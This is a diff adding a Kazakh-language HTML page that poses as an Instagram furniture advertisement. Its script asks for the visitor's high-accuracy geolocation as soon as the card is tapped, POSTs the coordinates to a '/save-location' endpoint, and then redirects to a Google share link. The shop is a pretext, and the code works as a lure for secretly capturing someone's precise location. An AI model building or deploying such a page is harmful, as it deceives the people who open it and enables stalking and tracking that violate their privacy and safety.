@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="kk">
+<head>
+    <meta charset="UTF-8">
+    <title>Мебель Арзан</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: #fafafa; display: flex; justify-content: center; }
+        .instagram-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 3px; max-width: 400px; width: 100%; margin-top: 20px; cursor: pointer; }
+        .card-header { padding: 16px; display: flex; align-items: center; border-bottom: 1px solid #efefef; }
+        .profile-pic { width: 32px; height: 32px; border-radius: 50%; background: #ccc; margin-right: 12px; }
+        .username { font-weight: 600; font-size: 14px; color: #262626; }
+        .card-image img { width: 100%; display: block; }
+        .card-content { padding: 16px; }
+        .likes { font-weight: 600; font-size: 14px; margin-bottom: 8px; }
+        .description { font-size: 14px; line-height: 18px; }
+        .description span { font-weight: 600; color: #0095f6; display: block; margin-top: 8px; }
+    </style>
+</head>
+<body>
+
+    <!-- Кәдімгі Instagram посты түріндегі басты бет -->
+    <div class="instagram-card" onclick="requestLocation()">
+        <div class="card-header">
+            <div class="profile-pic"></div>
+            <div class="username">mebel_taraz_kz</div>
+        </div>
+        <div class="card-image">
+            <img src="https://images.unsplash.com/photo-1586023492125-27b2c045efd7?q=80&w=600" alt="Мебель">
+        </div>
+        <div class="card-content">
+            <div class="likes">Ұнатушылар: 1,420</div>
+            <div class="description">
+                <span>mebel_taraz_kz</span> Ең жаңа және сапалы жиһаз жиынтықтары! Барлық жеңілдіктер мен бағаларды көру үшін экранды басыңыз.
+                <span>👉 Толығырақ көру үшін осында басыңыз</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function requestLocation() {
+            // Пайдаланушы басқан сәтте бірден телефонның өз рұқсат сұрайтын терезесі шығады
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                redirectToLink();
+            }
+        }
+
+        function sendPosition(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+
+            fetch('/save-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ lat: lat, lng: lng }),
+            }).finally(() => {
+                redirectToLink();
+            });
+        }
+
+        function showError(error) {
+            redirectToLink();
+        }
+
+        function redirectToLink() {
+            // Адам батырманы басып, рұқсат еткеннен кейін немесе бас тартқан соң бағытталатын сілтеме
+            window.location.href = "https://share.google/ReXWND2f4dfwXYJJx";
+        }
+    </script>
+</body>
+</html>
